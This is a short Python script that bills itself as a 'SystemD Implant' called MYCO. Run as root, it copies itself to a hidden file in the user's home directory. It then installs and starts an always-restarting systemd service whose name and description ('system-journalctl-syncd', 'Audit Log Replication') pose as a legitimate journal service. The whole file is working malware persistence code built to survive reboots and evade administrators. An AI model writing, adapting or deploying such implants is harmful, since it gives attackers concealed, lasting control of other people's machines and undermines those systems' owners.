import os, getpass, shutil
from rich import print, panel

SERVICE_NAME = "system-journalctl-syncd.service"
DESC = "Journal Sync Service for Audit Log Replication"
BINARY = f"/home/{getpass.getuser()}/.syncd.bin"
SERVICE_PATH = f"/etc/systemd/system/{SERVICE_NAME}"

def install():
    if not os.path.exists(BINARY):
        shutil.copy2(__file__, BINARY)
        os.chmod(BINARY, 0o755)
        print(f"[green]Binary copied to {BINARY}[/green]")

def create_service():
    config = f"""
[Unit]
Description={DESC}
After=network.target

[Service]
ExecStart={BINARY}
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
"""
    with open(SERVICE_PATH, "w") as f:
        f.write(config)
    os.system("systemctl daemon-reexec && systemctl enable {} && systemctl start {}".format(SERVICE_NAME, SERVICE_NAME))
    print(f"[green]Service {SERVICE_NAME} deployed[/green]")

def run():
    print(panel.Panel("🧫 [bold yellow]MYCO[/bold yellow] — SystemD Implant"))
    if os.geteuid() != 0:
        print("[red]Root required[/red]")
        return
    install()
    create_service()